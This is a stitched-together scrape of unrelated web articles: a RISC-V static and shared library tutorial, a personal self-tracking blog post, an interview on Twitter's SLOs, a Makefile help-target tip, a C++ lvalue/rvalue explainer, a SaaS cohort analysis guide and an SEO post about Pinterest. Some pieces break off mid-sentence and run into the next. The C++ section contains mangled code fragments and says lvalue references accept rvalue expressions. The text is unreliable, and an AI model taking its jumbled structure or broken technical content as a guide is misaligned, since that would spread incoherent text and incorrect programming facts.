<p>I specify -static so that gcc will pull in only .a files. When we are done, the file <em>test</em> will be a fully-contained, static executable. If we take a look at this file, we can see that all of the “stuff” we need for this executable makes it a fairly large file.</p>



<pre>-rwxr-xr-x 1 smarz smarz 4687920 Jun 1 09:16 test</pre>



<p>Yes, that’s 4,687,920 bytes or about 4.7 megabytes. However, if we looked at the symbol table, we will find that NO symbol is unresolved, and therefore this is a self contained executable. If we load this with our elf loader, no external resources will need to be pulled in.</p>



<p>Our linker must exhaustively follow every possible route and pull in those symbols even though they may never be called. We can see the symbol table is enormous due to all of the calls and global variable (such as errno).</p>

<p>Dynamic libraries end in .so, which stands for <em>shared object</em>. These libraries contain code that will not be added directly into the executable. Instead a program called the <em>dynamic linker</em> will be responsible for taking code from the .so files and adding them into an executing program. We can also add symbols ourselves using the -ldl (dynamic linker) library.</p>



<p>We can think of the term <em>dynamic</em> as <em>run-time</em>. That is, we don’t actually load the code into our program until the program actually runs. We can see this with something as simple as printf. We can examine our executable and we don’t see printf’s code. Instead, we see printf’s <em>stub</em>. This stub will then be replaced by the dynamic loader when the program executes.</p>



<p>When we link with a dynamic, shared object, those symbols that can be added at run time will remain unresolved. We will have the symbols’ names put into a table just so we know it’s out there somewhere. However, with shared objects, we now can get that <em>unresolved reference</em> (or symbol) at run-time! If you have arch-linux and have ever compiled anything yourself, you might’ve run into this phenomenon.</p>



<hr>



<h2>Making a Shared Library</h2>



<p>Let’s go ahead and turn our test2 file into a shared object. This is fairly easy to do with gcc:</p>



<pre>riscv64-unknown-linux-gcc -fPIC -shared -o libtest2.so test2.o</pre>



<p>The switch -fPIC stands for <em>position independent code</em>. That means all offsets cannot be relative outside of the library itself, and this is usually the case for most shared libraries. In this case, the generated code will be placed into a table to find the offsets. This is required since the library, or specific symbols in the library, can be loaded into any location by the dynamic linker.</p>



<p>Then, we can compile our test program to link to this shared library:</p>



<pre>riscv64-unknown-linux-gcc -o test test.o -L. -ltest2</pre>



<p>In the command above, I am specify the library search path with -L, so -L. means to look in the current directory. Then, I specify the library to link with using -ltest2. GCC will automatically prepend lib and append .so to make libtest2.so.</p>



<hr>



<h2 id="analyze">Analyzing A Shared Program</h2>



<p>First, we compile in the location of our library. We can see these shared libraries using the ldd command.</p>



<pre>smarz@DOMO:~ $ ./test<br>
./test: error while loading shared libraries: libtest2.so: cannot open shared object file: No such file or directory</pre>



<p>So, when I run my program, it looks at a certain path to find your libraries. This is analogous to the PATH environment variable, except in Linux (and some UNIXes), we use LD_LIBRARY_PATH. Shown below, if I change my path so the dynamic linker can find my library, it functions properly:</p>



<pre>smarz@DOMO:~ $ LD_LIBRARY_PATH=/home/smarz ./test 10 20<br>
Data = 200</pre>



<hr>



<h2 id="unresolved">Unresolved at Run Time</h2>



<p>When we link a program, many of the symbols will remain unresolved. This tells us what symbols the dynamic linker is responsible for loading from the shared objects (libraries). We can see these unresolved symbols using the nm command:</p>

  <p><img src="http://mtsolitary.com/assets/img/tableau.jpg"></p><p>This is a photograph of spring in Tel Aviv, into which I emerged from the coronavirus lockdown a little bleary-eyed and with a newfound addiction to chocolate <a href="https://en.wikipedia.org/wiki/Krantz_cake"><em>krantz</em></a> yeast cakes.</p>

<hr>

<h2 id="1-examining-your-life">1. Examining your life</h2>

<blockquote>
  <p>The unexamined life is not worth living.</p>
</blockquote>

<p>I’ve always been drawn to this quote, usually attributed to Socrates. The original <a href="https://en.wikipedia.org/wiki/The_unexamined_life_is_not_worth_living">meaning</a> of the quote is to emphasise the need for a personal philosophy, a way of thinking about yourself, that uses reflection to build a better future self through reference to and critique of the past self. Today, the quote brings to my mind the <a href="https://en.wikipedia.org/wiki/Quantified_self">quantified self movement</a>, a group of people who are devoted to the idea of collecting information about themselves, reviewing it and drawing insights from it to improve, or at the very least understand, their lives.</p>

<p>I’m not sure what Socrates would have to say about this modern “data-driven” philosophy, but I have become more and more drawn to the idea over the past couple of years. I thought it might be interesting to share some of the things I’ve noticed over the last five hundred days about myself, in the hope that this might inspire others to consider paying closer attention to their lives. There’s another reason for sharing too: I think there is a certain aesthetic value inherent in the topology of life one can see writ in the charts, the moving of a line along the page tracing some weird average of the thousands of variables that make up a day in anyone’s life that nonetheless contains some sort of signal.</p>

<h3 id="sleep">Sleep</h3>

<p>The older I become the more convinced I am that sleep is one of the most important, perhaps the single most important, factor in remaining balanced, peaceful and energetic throughout the day. The chart below shows the hours I slept every night, together with a moving 7-day average, over the last five hundred days. I don’t use any fancy sleep trackers, I just write down in a spreadsheet every morning how many hours I slept the previous night.</p>

<p><img src="http://mtsolitary.com/assets/img/sleep.png" alt="Sleep"></p>

<p>There are several periods of my life which are clearly visible on this graph. The most striking is the birth of my son, in February this year, following which there were understandably a few weeks of very little sleep. There are periods of greatly increased variation around holidays I took. And at the beginning of the COVID-19 lockdown I used the time I saved not commuting to and from work every day to catch up on some of that sleep I lost in February.</p>

<h3 id="alcohol">Alcohol</h3>

<p>The quantified self movement is convinced that sleep, alcohol, other drugs and caffeine (in that order usually) have the biggest overall impact on mood and general contentment in life. I track all of these metrics, and when I looked at the plots I generated I wondered whether I really wanted to share the graph below, in which a black bar represents a day on which I consumed alcohol over the last five hundred days.</p>

<p><img src="http://mtsolitary.com/assets/img/alcohol.png" alt="Alcohol"></p>

<p>It’s pretty clear from the graph above that I drink too frequently (I thought about colouring the bars by the number of drinks, which I also track but ultimately went for the simpler version). I also notice the correlation between consecutive drinking days (usually a beer or two or a glass of wine in the evening) and stressful periods in my life.</p>

<h3 id="work">Work</h3>

<p>While I was writing <a href="http://mtsolitary.com/journal/xxvii.html">XXVII</a> and <a href="http://mtsolitary.com/journal/xxviii.html">XXVIII</a> I was looking for a metric that shows a visible effect of the COVID-19 lockdown and the best one I could find is of my daily working hours (these are the hours between the time I count myself as starting work and the time I count myself as finishing, so they include time like lunchbreaks, coffee and chatting in the office when I wasn’t strictly-speaking “working”. I use <a href="http://rescuetime.com/">Rescuetime</a> to track actual bum-in-seat computer time at work but I think that’s a less interesting chart).</p>

<p><img src="http://mtsolitary.com/assets/img/work_dur.png" alt="Work"></p>

<p>I like the healthy amounts of vacation time, and on second thoughts I think the effect visible from February (after my return from a too-short paternity leave) is probably more to do with being a first-time parent than the lockdown <em>per se</em>.</p>

<h3 id="anxiety">Anxiety</h3>

<p>The holy grail of self-tracking, of the reflective data scientist, is an answer to the question “am I happy” based on actual data from your life. For me the answer to the question “am I happy” on a day-to-day basis can be approximated with the answer to the question “how anxious am I feeling today”, and to that end I tried my best to track my general mood and feeling of contentment (10) or anxiety (0) at three points throughout the last five hundred days.</p>

<p><img src="http://mtsolitary.com/assets/img/mood.png" alt="Mood"></p>

<p>Notwithstanding the concerns about the accuracy of the data the way I collected it (upon reflection the morning after, all three data points for the previous day at the same time, and with vague definitions of the cutoffs between the three sections of the day) this is a really interesting graph to look at over a timescale like this. My favourite feature of the graph is the easily visible section in June 2019 where my evening mood is vastly better than my day and morning mood; this is because I was on holiday with my friends and in the days recovering from the hangovers caused by the evenings. There’s also the rise to almost universal happiness around the birth of my son and the accompanying few weeks of time at home, before the uncertainty and panic around COVID-19 in mid-March put an end to that.</p>

<p>I noticed that there was something interesting about this graph when I looked at it during an “end-of-year review” process at the end of 2019, so I decided to start tracking a few more metrics related to anxiety. The most interesting, and most striking I think, is the “state of my fingernails”. It’s a simple 0-10 scale.</p>

<p><img src="http://mtsolitary.com/assets/img/nails.png" alt="Fingernails"></p>

<p>I’m not very proud of it, but I’ve been biting my fingernails for as long as I can remember. It’s absolutely a manifestation of anxiety and tension and I’m very aware that during difficult or stressful periods of my life I bite my fingernails more. It’s a habit that I would very much like to be rid of and I hope that understanding it is the first step to being free of it.</p>

<hr>

<p>Of course, none of this means anything if you don’t have the ability and the drive to actually act on the things you observe. That’s the next step for me, to try and <em>improve</em> the metrics in these graphs over time, to use my synthesised understanding of my past to influence the topology of these graphs in the future. Maybe that’s just a long-winded way of saying “examining yourself”: looking at yourself critically and trying to do better, or at the very least understand when you could do better and why you didn’t. I hope this post will go some way to making me accountable to myself, and hope to revisit these metrics and whichever new ones I start collecting throughout my life once a year to see how things are going.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><br><em>This is the second article of a two-part series. Click </em><a href="http://www.blameless.com/blog/twitters-reliability-journey"><em>here</em></a><em> for part 1 of the interview with Brian, Carrie, JP, and Zac to learn more about </em><a href="https://www.blameless.com/blog/twitters-reliability-journey"><em>Twitter’s SRE journey</em></a><em>.</em><br></p><p><a href="https://www.blameless.com/blog/twitters-reliability-journey">Previously</a>, we saw how SRE at Twitter has transformed their engineering practice to drive production readiness at scale. The concept of service level objectives (SLOs) and error budgets have been key to this transformation, as SLOs shape an organization’s ability to make data-oriented decisions around reliability. (Read <a href="https://www.blameless.com/how-slos-transformed-evernote/">here</a> for a definition of SLOs and how they transformed Evernote). Today, the Twitter team has invested in centralized tooling to measure, track, and visualize SLOs and their corresponding error budgets.&nbsp;<br></p><p>However, successfully implementing SLOs is far easier said than done. Many organizations have struggled with adoption for a number of reasons. Common obstacles include getting stakeholder buy-in, not knowing what (and how) to measure, and confusion over how to make SLOs actionable.&nbsp;&nbsp;<br></p><p>While the Twitter engineering team had laid a very strong foundation around observability and reliability, it took several important breakthroughs before SLOs began achieving broader adoption within the organization and the journey continues.<br></p><h3>The foundations for SLO</h3><p>Prior to SLOs, the engineers had used service level indicators (SLIs) for many years.&nbsp; The SLIs drew from Twitter’s extensive instrumentation of infrastructure and investments in their observability stack. Their observability stack provided a foundation for measuring service health with indicators such as success rate, latency, and throughput across their distributed service ecosystem. For example, the team would monitor the success rate for user-facing HTTP services, which they computed by looking at HTTP 500 errors versus total requests.&nbsp;<br></p><p>Integrating the SLIs with alerts and on-call rotations had been a core practice within their engineering teams for years.&nbsp; Additionally, their focus on incident management and postmortems has enabled them to continuously learn from their always evolving production ecosystem.<br></p><p>A significant inflection point came with embedding the concept of SLO within <a href="https://twitter.github.io/finagle/">Finagle</a>, Twitter’s RPC library, which is maintained by the Core Systems Libraries (CSL) team. As mentioned in the previous post, Finagle delivers reliability features such as load balancing, circuit breakers, failure detectors, and more, filling them inside every single piece of software that runs. In 2018, the CSL team made SLOs a first-class entity in the Twitter internal version of Finagle, creating a foundational API building block that is tied to a service boundary, which they call an objective. This was transformative in that it allowed the team to begin defining service-to-service interactions and modeling beyond just an alert, creating a programmatic definition that the team could now use to inform runtime decisions.&nbsp;<br></p><p>The Twitter team supported the implementation with proposals for projects and use cases that could use the SLO feature, and initially delivered the configuration as well as realtime per-instance measurement of SLOs.&nbsp;&nbsp;<br></p><p>In its initial phases, adoption of the feature was limited. Service owners could configure SLOs, but due to a lack of tooling and benefits automatically associated with turning SLOs on, there was little incentive to do so in context of other priorities.<br></p><p>Seeing this, the team invested in follow-up work. They began to build integrations and solutions for service owners on top of SLOs, such as load-shedding based on SLOs as they provided more useful context than a related metric like CPU throttling. Through piloting such enhancements, the appetite for adoption began to increase.&nbsp;<br></p><h3>Defining SLOs</h3><p>In thinking about how to define SLOs, the Twitter team typically begins by considering which features are key, and ensuring that they're well instrumented and understood.<br></p><p>It’s important to identify the signals that best reflect a critical user experience. Some signals for service success rate can provide color but are not so straightforward to interpret. For example, in analyzing the service error rate inside the data center, the client might retry those requests, making it a faulty datapoint to reason around what the true user success rate is.<br></p><p>Once the team sets a reasonable SLO at the top level, that will drive down through the services that a boundary depends on. Every service has a multitude of service dependencies, and thus the latency and success SLOs for all upstream and downstream services must all work together in context of the defined boundary. SLOs enable a more holistic way of measuring the whole call path.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 	</p><h3>A major turning point: tying SLOs to error budgets</h3><p>The introduction of error budgets marked another critical inflection point in Twitter’s adoption of SLOs. Error budgets make SLOs actionable and provide a different lens to understand a service over time, so they were an important follow-on feature after the original delivery of SLOs.&nbsp;<br></p><p>Error budgets look at the SLO over time, and thus have allowed the team to begin tracking performance by providing a historical view into how the service met objectives through different timeframes. The traditional metric view tends to be shortsighted, and can bury signals around valuable trends and opportunities. Instead of a dashboard that charts hundreds of metrics, error budgets become a forcing function to pick a few of the most important metrics, and get deeper into how and why they change over time.&nbsp;<br></p><p>An important note is that the team does not prescribe a fixed set of actions upon the exhaustion of the error budget. While error budgets can be a powerful tool, the true value has to resonate with engineering and product teams.&nbsp;<br></p><p>With the notion of “<a href="https://www.linkedin.com/pulse/netflixs-context-control-how-does-work-steve-urban/">context, not control</a>” (coined by Netflix), there is strong emphasis on empowering well-intentioned, capable teammates with visualizations and insights to allow them to make better decisions. In the same way, Twitter SREs apply ongoing experimentation to understand what other team members will view as valuable to measure. They understand that error budgets are more about giving team members good tools and context; there is no one policy fits all.&nbsp;&nbsp;<br></p><p>For example, one team hypothesized that the error budget would help inform when automated deploys could proceed, and specifically, whether to pause a deploy if the error budget was exhausted.&nbsp; But what they found was that sometimes the deploy being paused or blocked could contain the fix for the increased errors. Thus, that simple rule of “block deploys if no error budget remains” quickly began to fall apart. The very deploy getting blocked could decrease the volume or rate of errors, and possibly even defend the SLO and enable it to be met over its remaining duration of time.&nbsp;<br></p><p>Bearing in mind that they aren’t necessarily meant to be prescriptive, error budgets provide very useful suggestions for service owners in thinking about how to prioritize work. They create an important ‘runway’ for scaling the pace of innovation up or down. For example, overly rapid error budget burndown could be a sign to prioritize mitigation work for the current on-call or an upcoming sprint. Alternatively, not using enough of the error budget could nudge the team to iterate on feature work faster, or experiment more.&nbsp;</p><h3>The benefits of SLO</h3><p>While the team is still early in its adoption of SLOs, they’ve already seen the immense potential and value of SLOs in several ways.&nbsp;<br></p><p><strong><em>From a ‘distributed service zoo’ to a shared language</em></strong></p><p>Twitter has hundreds, if not thousands, of services, making its infrastructure a complex beast to understand. The current members of the Twitter Command Center (TCC) have been around long enough where they generally know what most of the services are and how services ‘snap together’. However, they know that eventually they will reach a point where that becomes impossible, where no one individual can grok how it all works. By investing in SLOs now to help guide discussions, the goal is that by the time they reach that point of un-knowable complexity, they will have set themselves up to manage service metrics programmatically.<br></p><p><strong><em>The right amount of context</em></strong></p><p>Context is the key. Dashboards can easily have hundreds of charts which translate into thousands of metrics. Teams might have tens or hundreds of alerts on their services across multiple data centers. These dashboards, metrics, and alerts are helpful for those running those services, but they're very high context, and information overload for anyone else.&nbsp;<br></p><p>SLOs create the ability to have more directed conversations with shared context. Instead of looking at a hundred pictures of a dashboard, the team can align on the four or five things that matter. lf any of those are not green, others can understand that something's not right without having to know anything else about the service.<br></p><p><strong><em>Dynamic load balancing and load shedding</em></strong></p><p>By making SLOs a first class entity, services can speak it at the programming level, beyond just measuring it. This enables the team to make systematic improvements using SLOs as a building block. For example, the team is exploring whether back pressure in Finagle can instead be SLO-based.<br></p><p>With Finagle, services can programmatically detect when they are under load (typically with second class signals such as CPU), and then signal to redirect traffic to another instance. Instead of relying on second class signals to implement back pressure, a service can directly know if it’s trending towards an SLO violation in order to signal back pressure and reduce load on itself.<br></p><p><strong><em>Graceful degradation</em></strong></p><p>One of the Twitter team’s goals for SLO is in gracefully degrading services during large-scale events to ensure that core functionality is always available. Rather than an all-or-nothing failure mode, the team aims to gracefully degrade services by stripping away peripheral features while maintaining core functionality.<br></p><p>The Twitter team is interested in utilizing SLOs to implement a selective circuit breaker pattern to …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p><code>make</code> is great tool to orchestrate the setup and build process of a project. It expects a <code>Makefile</code>, where we define targets to execute, like for example <code>install</code> and <code>run</code>. Then we can use <code>make install</code> and <code>make run</code> to execute those tasks.</p> <p>While target names like <code>install</code> are quite common, the problems arise when we have to deal with a lengthy <code>Makefile</code>, and we are not aware of all the available targets.</p> <p>Hopefully, with a slight modification of our current <code>Makefile</code> and the addition of a new target, we can expose this information and access it from the Terminal app. Let’s see how!</p> <p>First, we will have to document each of the existing targets. To do so, we will add a comment starting with <code>##</code> right after the target’s name.</p> <div><div><pre><code><span>install</span>: <span>## Install </span>
	@echo <span>"Installing..."</span>

run: <span>## Run</span>
	@echo <span>"Running..."</span>
</code></pre></div></div> <p>Then, we will use the <code>grep</code> and <code>sed</code> command to get the name of the target and the documentation, like in the following snippet:</p> <div><div><pre><code>.DEFAULT_GOAL :<span>=</span> <span>help</span>
.PHONY: <span>help

help</span>:
	@grep <span>-E</span> <span>'^[a-zA-Z0-9_-]+:.*?## .*$$'</span> <span>$(</span>MAKEFILE_LIST<span>)</span> <span>\</span>
	| <span>sed</span> <span>-n</span> <span>'s/^\(.*\): \(.*\)##\(.*\)/\1\3/p'</span> <span>\</span>
	| column <span>-t</span>  <span>-s</span> <span>' '</span>
</code></pre></div></div> <p>We will also set the <code>.PHONY</code> and the <code>.DEFAULT_GOAL</code> variables. The last one will make <code>help</code> the default target when running <code>make</code> without a specific target.</p> <p>Now, if we head back to the Terminal app, and run <code>make</code>, we will get the list of the documented targets as an output <img title=":rocket:" alt=":rocket:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f680.png" height="20" width="20"></p>
<pre><code>install  Install
run      Run
</code></pre>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <h3 id="introduction">Introduction</h3>

<p>The concepts of lvalue and rvalue in C++ had been confusing to me ever since I started to learn C++. I did not fully understand the purpose and motivation of having these two concepts during programming and had not been using rvalue reference in most of my projects. Given most of the documentation on the topic of lvalue and rvalue on the Internet are lengthy and lack of concrete examples, I feel there could be some developers who have been confused as well.</p>



<p>In this blog post, I would like to introduce the concepts of lvalue and rvalue, followed by the usage of rvalue reference and its application in move semantics in C++ programming.</p>

<h3 id="lvalue-vs-rvalue">lvalue VS rvalue</h3>

<p>In C++, each expression, such as an operator with its operands, literals, and variables, has type and value. We could categorize each expression by type or value. Each expression is either lvalue (expression) or rvalue (expression), if we categorize the expression by value. Note that when we say lvalue or rvalue, it refers to the expression rather than the actual value in the expression, which is confusing to some people. So personally I would rather call an expression lvalue expression or rvalue expression, without omitting the word “expression”.</p>



<p>lvalue expression is so-called because historically it could appear on the left-hand side of an assignment expression, while rvalue expression is so-called because it could only appear on the right-hand side of an assignment expression. lvalue expression is associated with a specific piece of memory, the lifetime of the associated memory is the lifetime of lvalue expression, and we could get the memory address of it. rvalue expression might or might not take memory. Even if an rvalue expression takes memory, the memory taken would be temporary and the program would not usually allow us to get the memory address of it.</p>

<h4 id="example">Example</h4>

<span>class</span> <span>Foo</span>

    <span>Foo</span> <span>foo2</span><span>{</span><span>20</span><span>};</span> <span>// rvalue expression as a whole, foo2 is lvalue expression</span>
    <span>foo1</span> <span>=</span> <span>Foo</span><span>();</span> <span>// rvalue expression as a whole, foo1 is lvalue expression, Foo() is rvalue expression and takes temporary memory</span>

    <span>printFoo1</span><span>(</span><span>foo1</span><span>);</span> <span>// rvalue expression as a whole, printFoo1 is lvalue expression</span>
    <span>printFoo2</span><span>(</span><span>foo1</span><span>);</span> <span>// rvalue expression as a whole, printFoo2 is lvalue expression</span>

<span>}</span>
</code></pre></div></div>

<h3 id="rvalue-reference">rvalue Reference</h3>

<p><code>T&amp;</code> is the operator for lvalue reference, and <code>T&amp;&amp;</code> is the operator for rvalue reference. Literally it means that lvalue reference accepts an lvalue expression and lvalue reference accepts an rvalue expression.</p>

<p>In this particular example, at first glance, the rvalue reference seems to be useless. Why would we bother to use rvalue reference given lvalue could do the same thing. In the next section, we would see that rvalue reference is used for move semantics which could potentially increase the performance of the program under some circumstances. We would also see that only by rvalue reference we could distinguish move semantics from copy semantics.</p>

<h3 id="move-semantics">Move Semantics</h3>

<p>In C++, we could create a new variable from another variable, or assign the value from one variable to another variable. To keep both variables “alive”, we would use copy semantics, i.e., copy one variable to another. In some scenarios, after assigning the value from one variable to another variable, the variable that gave the value would be no longer useful, so we would use move semantics.</p>



<p>Because move semantics does fewer memory manipulations compared to copy semantics, it is faster than copy semantics in general. Let’s take a look at the following example.</p>

<p>Cohort analysis is a method that allows you to break your data set into the specific groups, examine the lifecycle of each group, and compare them to each other.</p>

<p>It is a great way to find critical points within a customer lifecycle. You can use cohort analysis to understand if you are improving the provided service with time.</p>

<p>In the SaaS world, we usually use cohort analysis to get a deeper understanding of churn or customer retention.</p>

<h2 id="how-to-build-a-cohort">How to build a cohort</h2>

<p>Let's take a SaaS company that already has some customer base. The first step is to split the whole customer base into separate groups – cohorts. In SaaS, we usually group customers by the month they joined the service.</p>

<p>For example, in May 2019 our imaginary SaaS company had 120 new customers. This group of 120 customers will form one May 2019 cohort. Now, from these 120 customers, how many were still using the service as of the end of June 2019? Let’s say 100. From this 100 how many were left in July 2019? And so on. You keep asking this question till the current date.</p>

<p>Here is the progression of the May 2019 cohort.</p>

<p><img src="https://i.snap.as/7z7RCO4.png" alt=""></p>

<p>What can you understand by examining this one cohort? One thing is that within just 13 months the company loses 100 from 120 customers it started with. Certainly not the best performance. The biggest drop happens in Month 1 and Month 13. This is also very useful information. Perhaps it is so because the company sells monthly or yearly contracts.</p>

<p>The next step is to add newer cohorts. Customers joining in the month of June 2019 will form the June cohort and so on.</p>

<p>Here is the example of customer cohorts for our SaaS company:</p>

<p><img src="https://i.snap.as/DsxsSvW.png" alt=""></p>

<p>Once you have split your data set into cohorts with the number of customers,  you can use this data to calculate any SaaS metric to get a deeper understanding of them. Let’s see how we can do that on the example of customer churn, MRR churn, and customer retention.</p>

<h2 id="using-cohort-analysis-to-understand-customer-churn">Using cohort analysis to understand customer churn</h2>

<p>Having the cohorts with customers number is nice, but it is not very visual, and still requires a lot of digging into the numbers to understand what is going on.</p>

<p>Let’s use this data and examine customer churn. For each month of the cohort’s life, we have to calculate what % of customers were lost.</p>

<p>For example, in May 2019 we had 120 customers and only 100 of them were left after a month. So the churn for Month 1 will be:</p>

<p><code>(120 - 100) / 120 = 16%</code></p>

<p>When calculating churn for Month 2 we can do two things. We can either calculate it relative to the previous month like so:</p>

<p><code>(100 - 89) / 100 = 11%</code></p>

<p>Or we can calculate it relative to the Month 0:</p>

<p><code>(120 - 89) / 120 = 25%</code></p>

<p>These two approaches give you a slightly different picture. The first tells you churn at any given month of the cohort life. The second gives you an understanding of what percent of all customers from the given cohort (the month 0 number) were lost until the particular month.</p>

<p>For example, if we started with 120 customers, and in Month 3 churn relative to month 0 is 35% it means that we lost 42 customers already.</p>

<p><code>120 * .35 = 42</code></p>

<p>Let’s calculate churn relative to the previous month for all cohorts.</p>

<p><img src="https://i.snap.as/S5Bj15s.png" alt=""></p>

<p>We have added conditional formatting to highlight cells with higher churn and draw attention to them. This feature is available in Google Spreadsheets and Excel and is very useful when it comes to cohorts visualization.</p>

<p>Now you can clearly see at what month your churn is the highest.</p>

<h2 id="a-few-words-on-calculation-relative-to-month-0-vs-previous-month">A few words on calculation relative to month 0 VS previous month</h2>

<p>When looking at cohorts where percent is calculated relative to the previous month it is important to understand that higher percentages do not necessarily mean the highest number of lost customers. For example, losing 20 customers out of a 100 will result in a 20% churn with 20 customers lost, but losing 40 out of a 300 will result in a 13% churn with 40 customers lost. So the churn is lower but the number of lost customers is higher.</p>

<p>When presenting cohorts with percent calculation relative to the previous month it is always useful to pair it with cohorts showing pure numbers. So that a reader can easily understand what actual number a given percentage will convert.</p>

<h2 id="how-to-read-cohort-analysis">How to read cohort analysis</h2>

<p>You have to understand that the time on the cohort table is passing in two directions. From left to right – as each cohort progresses with its life. From top to the bottom – with each new cohort being added at the bottom.</p>

<p>This means two things:</p>
<ol><li>You would expect younger cohorts to perform better compared to the older once. As time passes, hopefully, you improve the service you provide. It becomes more mature. You sell to customers that are a better fit for your product.</li>
<li>You would expect a cohort to stabilize as more months pass. Hopefully, once customers have adopted your product they will stay with it for longer and will not churn at such a high rate as at the beginning of the lifecycle.</li></ol>

<p>Here is how we can apply this to churn cohorts:</p>

<p><img src="https://i.snap.as/9Xx3grt.png" alt=""></p>

<h2 id="using-cohort-analysis-to-understand-mrr-churn">Using cohort analysis to understand MRR churn</h2>

<p>You can use quite a few different metrics as a value for your cohort. MRR is a very good example. By calculating the MRR retention rate for each cohort you can easily understand not only where you lose the most of your money but also if you manage to grow revenue over the lifespan of the specific cohort.</p>

<p>Let’s take a look at the example below:</p>

<p><img src="https://i.snap.as/BHVoC8y.png" alt=""></p>

<p>You can see that in younger cohorts, specifically Feb 2020, Mar 2020, Apr 2020 our company managed to cover all MRR churn by expanding existing customers’ MRR. Thus achieving +100% MRR retention. These cohorts have more MRR in Month 2-4 than in Month 0. This is a great sign that you are doing something right and can expand your existing customer base.</p>

<h2 id="a-different-way-to-visualize-cohorts">A different way to visualize cohorts</h2>

<p>I want to describe one different way to visualize your cohort data. It gives you a good visual clue into the underlying patterns. The approach is to visualize your cohort as a multiple line chart.</p>

<p>Let’s take customer retention this time. We don’t really need to do any additional calculations here. It is the initial data we started our post with. From all customers that sign up in May 2019 how many left in June, and so on.</p>

<p>What we can do is instead of putting these data in the table, we can draw them as lines. The X-axis represents the lifecycle month of the cohort. The Y-axis represents the number of customers left in a given month of the lifecycle.</p>

<p>Here is the example of such visualization for our imaginary company:</p>

<p><img src="https://i.snap.as/ssFqV11.png" alt=""></p>

<p>When examining such visualization you want to look for three main things:</p>
<ol><li>Newer cohort lines should stay above the older cohort lines. That means that the new cohort has more customers and you are able to retain them better.</li>
<li>Hopefully, after the initial drop, the line will stabilize and go almost in parallel with the X-axes. It means that once customers adopt your product they stay with it and churn at a much lower rate than initially.</li>
<li>New lines should have a more shallow initial drop compared to the older ones. You can see on the example above how lines which are on top have much more shallow drops. This means that you are improving your service, and customers need less time to see its value.</li></ol>

<p>There are many different metrics you can use as a cohort value. We presented some of the most common ones.</p>

<p>I hope it was useful and if you have any questions or comments please feel free to reach out.</p>

<p>By <strong><a href="https://twitter.com/ryanbed">Ryan Bednar</a></strong> (CEO of <a href="https://www.rankscience.com/">RankScience</a>)</p>
<blockquote><p><span>Update</span>: This post got a ton of traffic on Hacker News today and&nbsp;Pinterest reached out to comment: “The claim that we scrape Google search results is false. We do not, and never have, scraped Google search results at any time.” The original article suggested Pinterest scrapes Google directly, but instead it seems more likely that Pinterest grabs data from Google through it’s Chrome Extension. We’ll update this post as we learn more from them.</p></blockquote>
<p>A few weeks ago in the Twitterverse, @SwiftOnSecurity <a href="https://twitter.com/SwiftOnSecurity/status/1258875333446717445" target="_blank" rel="noopener noreferrer">outed Pinterest</a> for using a somewhat surprising SEO tactic: for every image uploaded to Pinterest that doesn’t have any real metadata or description of the picture, Pinterest automatically performs a reverse image search on Google, scrapes all of the metadata and descriptions they can find for that image, and then uploads that content onto their site and pretends it’s from their own users.</p>
<p>This is interesting for a couple of reasons:</p>
<ul>
<li dir="ltr" role="presentation"><span>Google typically does not react kindly to anyone trying to scrape its results </span><i><span>for any reason</span></i><span>, so this is incredibly difficult to do at scale (across hundreds of millions of photos) without being blocked.</span></li>
<li dir="ltr" role="presentation"><span>Often when somewhat shady SEO tactics are exposed on Twitter, Google responds by issuing a manual action and penalizing the offending site in search results. This famously happened to </span><a href="https://marketingland.com/10-big-brands-that-were-penalized-by-google-69646"><span>Genius years ago as they were put in time-out</span></a><span> and told to re-evaluate their blackhat SEO strategy. </span></li>
<li dir="ltr" role="presentation"><span>Pinterest is a publicly traded company, so if they’re penalized it could hurt the company’s stock price ($PINS).</span></li>
</ul>
<p><i><span>Content relevance</span></i><span>&nbsp;is a ranking factor in Google. The closer semantically you can describe a topic or image to how Google understands it, the better your chances of ranking higher in their index. Will Google find this behavior flagrantly blackhat and respond accordingly? </span></p>

<h2><strong>Some background on Pinterest SEO</strong></h2>
<p><span>Pinterest has been super successful with SEO growth over the years. Their post on </span><a href="https://medium.com/pinterest-engineering/demystifying-seo-with-experiments-a183b325cf4c"><span>Demystifying SEO with Experiments</span></a><span> was particularly inspirational for me in deciding to start </span><a href="https://www.rankscience.com/"><span>RankScience</span></a><span>, an SEO automation and A/B testing company. So any time I hear about programmatic SEO tactics that work on a site as large as Pinterest, with 800M+ pages indexed in Google, I’m intrigued. This is obviously a strategy they would never talk about doing publicly, so it’s fascinating to see it exposed and called out like this.</span></p>
<h2><strong>So how exactly does this Pinterest SEO growth hack work?</strong></h2>
<ul>
<li><span>User uploads a photo to Pinterest without any meta data.</span></li>
<li><span>Pinterest performs a reverse image search on Google for that image.</span></li>
<li><span>Pinterest scrapes all the text captions for related photos that appear from Google.</span></li>
<li><span>Pinterest publishes these text captions under </span><b>What others are saying</b><span> on their own page.</span></li>
<li></li>
</ul>

<p><img src="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png" alt="Pinterest SEO growth hack" width="504" height="652" srcset="https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM.png 940w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-232x300.png 232w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-792x1024.png 792w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-768x993.png 768w, https://www.rankscience.com/wp-content/uploads/2020/06/Screen-Shot-2020-06-30-at-9.57.30-AM-600x776.png 600w" sizes="(max-width: 504px) 100vw, 504px"></p>

<p><span>Voila! Instant unique and scalable SEO text content that maps directly to Google’s understanding of the photo.&nbsp;</span><span>Google indexes the Pinterest page with the new text content and ranks it higher because of the strong relevance of the text on the page to its existing understanding of the photo.&nbsp;</span><span>Rinse and repeat across millions of photos.</span></p>
<h2><strong>The SEO community took notice:</strong></h2>
